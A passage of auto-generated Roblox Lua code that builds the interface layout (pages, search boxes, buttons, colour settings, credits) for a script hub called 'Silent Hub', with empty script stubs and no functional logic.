G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["41"]["Name"] = [[ButtonContainer]];
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["41"]["Size"] = UDim2.new(0, 470, 0, 214);
G2L["41"]["Position"] = UDim2.new(0.01646, 0, 0.14008, 0);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["ScrollBarThickness"] = 0;
G2L["41"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.LocalScript
G2L["42"] = Instance.new("LocalScript", G2L["41"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.UICorner
G2L["43"] = Instance.new("UICorner", G2L["41"]);
G2L["43"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.Button
G2L["44"] = Instance.new("TextButton", G2L["41"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["TextSize"] = 14;
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["BackgroundTransparency"] = 0.95;
G2L["44"]["Size"] = UDim2.new(0, 452, 0, 24);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Name"] = [[Button]];
G2L["44"]["Position"] = UDim2.new(0.0383, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.Button.UICorner
G2L["45"] = Instance.new("UICorner", G2L["44"]);
G2L["45"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.UIListLayout
G2L["46"] = Instance.new("UIListLayout", G2L["41"]);
G2L["46"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["46"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["46"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs
G2L["47"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["47"]["Visible"] = false;
G2L["47"]["Active"] = true;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["47"]["ScrollingEnabled"] = false;
G2L["47"]["Name"] = [[GUIs]];
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["47"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["ScrollBarThickness"] = 5;
G2L["47"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["47"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.UICorner
G2L["48"] = Instance.new("UICorner", G2L["47"]);
G2L["48"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox
G2L["49"] = Instance.new("TextBox", G2L["47"]);
G2L["49"]["Name"] = [[SearchBox]];
G2L["49"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["TextWrapped"] = true;
G2L["49"]["TextSize"] = 14;
G2L["49"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["49"]["PlaceholderText"] = [[Search GUIs]];
G2L["49"]["Size"] = UDim2.new(0, 470, 0, 24);
G2L["49"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Text"] = [[]];
G2L["49"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox.LocalScript
G2L["4a"] = Instance.new("LocalScript", G2L["49"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.SearchBox.UICorner
G2L["4b"] = Instance.new("UICorner", G2L["49"]);
G2L["4b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer
G2L["4c"] = Instance.new("ScrollingFrame", G2L["47"]);
G2L["4c"]["Active"] = true;
G2L["4c"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["4c"]["Name"] = [[ButtonContainer]];
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["4c"]["Size"] = UDim2.new(0, 470, 0, 214);
G2L["4c"]["Position"] = UDim2.new(0.01646, 0, 0.14008, 0);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["ScrollBarThickness"] = 0;
G2L["4c"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.LocalScript
G2L["4d"] = Instance.new("LocalScript", G2L["4c"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.UICorner
G2L["4e"] = Instance.new("UICorner", G2L["4c"]);
G2L["4e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.Button
G2L["4f"] = Instance.new("TextButton", G2L["4c"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextSize"] = 14;
G2L["4f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4f"]["BackgroundTransparency"] = 0.95;
G2L["4f"]["Size"] = UDim2.new(0, 452, 0, 24);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Name"] = [[Button]];
G2L["4f"]["Position"] = UDim2.new(0.0383, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.Button.UICorner
G2L["50"] = Instance.new("UICorner", G2L["4f"]);
G2L["50"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.GUIs.ButtonContainer.UIListLayout
G2L["51"] = Instance.new("UIListLayout", G2L["4c"]);
G2L["51"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["51"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["51"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps
G2L["52"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["52"]["Visible"] = false;
G2L["52"]["Active"] = true;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["52"]["ScrollingEnabled"] = false;
G2L["52"]["Name"] = [[Maps]];
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["52"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["ScrollBarThickness"] = 5;
G2L["52"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["52"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.UICorner
G2L["53"] = Instance.new("UICorner", G2L["52"]);
G2L["53"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox
G2L["54"] = Instance.new("TextBox", G2L["52"]);
G2L["54"]["Name"] = [[SearchBox]];
G2L["54"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["TextWrapped"] = true;
G2L["54"]["TextSize"] = 14;
G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["PlaceholderText"] = [[Search Maps]];
G2L["54"]["Size"] = UDim2.new(0, 470, 0, 24);
G2L["54"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Text"] = [[]];
G2L["54"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["54"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.SearchBox.UICorner
G2L["56"] = Instance.new("UICorner", G2L["54"]);
G2L["56"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer
G2L["57"] = Instance.new("ScrollingFrame", G2L["52"]);
G2L["57"]["Active"] = true;
G2L["57"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["57"]["Name"] = [[ButtonContainer]];
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["57"]["Size"] = UDim2.new(0, 470, 0, 214);
G2L["57"]["Position"] = UDim2.new(0.01646, 0, 0.14008, 0);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["ScrollBarThickness"] = 0;
G2L["57"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.LocalScript
G2L["58"] = Instance.new("LocalScript", G2L["57"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.UICorner
G2L["59"] = Instance.new("UICorner", G2L["57"]);
G2L["59"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.Button
G2L["5a"] = Instance.new("TextButton", G2L["57"]);
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["TextSize"] = 14;
G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5a"]["BackgroundTransparency"] = 0.95;
G2L["5a"]["Size"] = UDim2.new(0, 452, 0, 24);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["Name"] = [[Button]];
G2L["5a"]["Position"] = UDim2.new(0.0383, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.Button.UICorner
G2L["5b"] = Instance.new("UICorner", G2L["5a"]);
G2L["5b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Maps.ButtonContainer.UIListLayout
G2L["5c"] = Instance.new("UIListLayout", G2L["57"]);
G2L["5c"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["5c"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["5c"]["Padding"] = UDim.new(0.05, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings
G2L["5d"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["5d"]["Visible"] = false;
G2L["5d"]["Active"] = true;
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["5d"]["ScrollingEnabled"] = false;
G2L["5d"]["Name"] = [[Settings]];
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["5d"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["ScrollBarThickness"] = 5;
G2L["5d"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["5d"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.UICorner
G2L["5e"] = Instance.new("UICorner", G2L["5d"]);
G2L["5e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer
G2L["5f"] = Instance.new("Frame", G2L["5d"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["5f"]["Position"] = UDim2.new(0, 0, 0.73152, 0);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Name"] = [[ButtonContainer]];
G2L["5f"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.SaveSettings
G2L["60"] = Instance.new("TextButton", G2L["5f"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["TextSize"] = 14;
G2L["60"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["60"]["BackgroundTransparency"] = 0.95;
G2L["60"]["Size"] = UDim2.new(0, 206, 0, 45);
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Text"] = [[Save Settings]];
G2L["60"]["Name"] = [[SaveSettings]];
G2L["60"]["Position"] = UDim2.new(-0.45504, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.SaveSettings.UICorner
G2L["61"] = Instance.new("UICorner", G2L["60"]);
G2L["61"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.UIListLayout
G2L["62"] = Instance.new("UIListLayout", G2L["5f"]);
G2L["62"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["62"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["62"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["62"]["Padding"] = UDim.new(0.05, 0);
G2L["62"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["62"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.ResetSettings
G2L["63"] = Instance.new("TextButton", G2L["5f"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["TextSize"] = 14;
G2L["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["BackgroundTransparency"] = 0.95;
G2L["63"]["Size"] = UDim2.new(0, 206, 0, 45);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Text"] = [[Reset Settings]];
G2L["63"]["Name"] = [[ResetSettings]];
G2L["63"]["Position"] = UDim2.new(-0.00815, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.ResetSettings.UICorner
G2L["64"] = Instance.new("UICorner", G2L["63"]);
G2L["64"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer
G2L["65"] = Instance.new("Frame", G2L["5d"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Name"] = [[ColorContainer]];
G2L["65"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.UIListLayout
G2L["66"] = Instance.new("UIListLayout", G2L["65"]);
G2L["66"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["66"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["66"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["66"]["Padding"] = UDim.new(0.05, 0);
G2L["66"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["66"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Red
G2L["67"] = Instance.new("TextBox", G2L["65"]);
G2L["67"]["Name"] = [[Red]];
G2L["67"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextWrapped"] = true;
G2L["67"]["TextSize"] = 14;
G2L["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["PlaceholderText"] = [[Red]];
G2L["67"]["Size"] = UDim2.new(0, 128, 0, 45);
G2L["67"]["Position"] = UDim2.new(-0.1858, 0, 0.17391, 0);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[]];
G2L["67"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Red.LocalScript
G2L["68"] = Instance.new("LocalScript", G2L["67"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Red.UICorner
G2L["69"] = Instance.new("UICorner", G2L["67"]);
G2L["69"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Green
G2L["6a"] = Instance.new("TextBox", G2L["65"]);
G2L["6a"]["Name"] = [[Green]];
G2L["6a"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["PlaceholderText"] = [[Green]];
G2L["6a"]["Size"] = UDim2.new(0, 128, 0, 45);
G2L["6a"]["Position"] = UDim2.new(0.10964, 0, 0.17391, 0);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Text"] = [[]];
G2L["6a"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Green.LocalScript
G2L["6b"] = Instance.new("LocalScript", G2L["6a"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Green.UICorner
G2L["6c"] = Instance.new("UICorner", G2L["6a"]);
G2L["6c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Blue
G2L["6d"] = Instance.new("TextBox", G2L["65"]);
G2L["6d"]["Name"] = [[Blue]];
G2L["6d"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["TextWrapped"] = true;
G2L["6d"]["TextSize"] = 14;
G2L["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["PlaceholderText"] = [[Blue]];
G2L["6d"]["Size"] = UDim2.new(0, 128, 0, 45);
G2L["6d"]["Position"] = UDim2.new(0.40508, 0, 0.17391, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Text"] = [[]];
G2L["6d"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Blue.LocalScript
G2L["6e"] = Instance.new("LocalScript", G2L["6d"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ColorContainer.Blue.UICorner
G2L["6f"] = Instance.new("UICorner", G2L["6d"]);
G2L["6f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer
G2L["70"] = Instance.new("Frame", G2L["5d"]);
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["70"]["Position"] = UDim2.new(0, 0, 0.249, 0);
G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["Name"] = [[ScaleContainer]];
G2L["70"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.UIListLayout
G2L["71"] = Instance.new("UIListLayout", G2L["70"]);
G2L["71"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["71"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["71"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["71"]["Padding"] = UDim.new(0.05, 0);
G2L["71"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["71"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale
G2L["72"] = Instance.new("TextBox", G2L["70"]);
G2L["72"]["Name"] = [[Scale]];
G2L["72"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextWrapped"] = true;
G2L["72"]["TextSize"] = 14;
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["PlaceholderText"] = [[Scale]];
G2L["72"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["72"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[]];
G2L["72"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale.LocalScript
G2L["73"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale.UICorner
G2L["74"] = Instance.new("UICorner", G2L["72"]);
G2L["74"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer
G2L["75"] = Instance.new("Frame", G2L["5d"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["75"]["Position"] = UDim2.new(0, 0, 0.48, 0);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Name"] = [[RainbowContainer]];
G2L["75"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer.UIListLayout
G2L["76"] = Instance.new("UIListLayout", G2L["75"]);
G2L["76"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["76"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["76"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["76"]["Padding"] = UDim.new(0.05, 0);
G2L["76"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["76"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer.Rainbow
G2L["77"] = Instance.new("TextButton", G2L["75"]);
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["TextSize"] = 14;
G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["77"]["BackgroundTransparency"] = 0.95;
G2L["77"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Text"] = [[Rainbow Background]];
G2L["77"]["Name"] = [[Rainbow]];
G2L["77"]["Position"] = UDim2.new(-0.45504, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer.Rainbow.UICorner
G2L["78"] = Instance.new("UICorner", G2L["77"]);
G2L["78"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits
G2L["79"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["79"]["Visible"] = false;
G2L["79"]["Active"] = true;
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["79"]["ScrollingEnabled"] = false;
G2L["79"]["Name"] = [[Credits]];
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["79"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["ScrollBarThickness"] = 5;
G2L["79"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["79"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits.UICorner
G2L["7a"] = Instance.new("UICorner", G2L["79"]);
G2L["7a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits.Credits
G2L["7b"] = Instance.new("TextLabel", G2L["79"]);
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["TextSize"] = 30;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["BackgroundTransparency"] = 1;
G2L["7b"]["RichText"] = true;
G2L["7b"]["Size"] = UDim2.new(0, 486, 0, 207);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[Silent Hub is developed by hyperionhax, all script credits go to their respective creators.]];
G2L["7b"]["Name"] = [[Credits]];


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits.Logo
G2L["7c"] = Instance.new("ImageLabel", G2L["79"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["Image"] = [[rbxassetid://71596851736559]];
G2L["7c"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["BackgroundTransparency"] = 1;
G2L["7c"]["Name"] = [[Logo]];
G2L["7c"]["Position"] = UDim2.new(0.39712, 0, 0.61089, 0);


-- StarterGui.SilentHub.UI.MainContainer.UIShadow
G2L["7d"] = Instance.new("UIShadow", G2L["3"]);



-- StarterGui.SilentHub.UI.MainContainer.UIScale
G2L["7e"] = Instance.new("UIScale", G2L["3"]);



-- StarterGui.SilentHub.UI.MainContainer.UICorner
G2L["7f"] = Instance.new("UICorner", G2L["3"]);
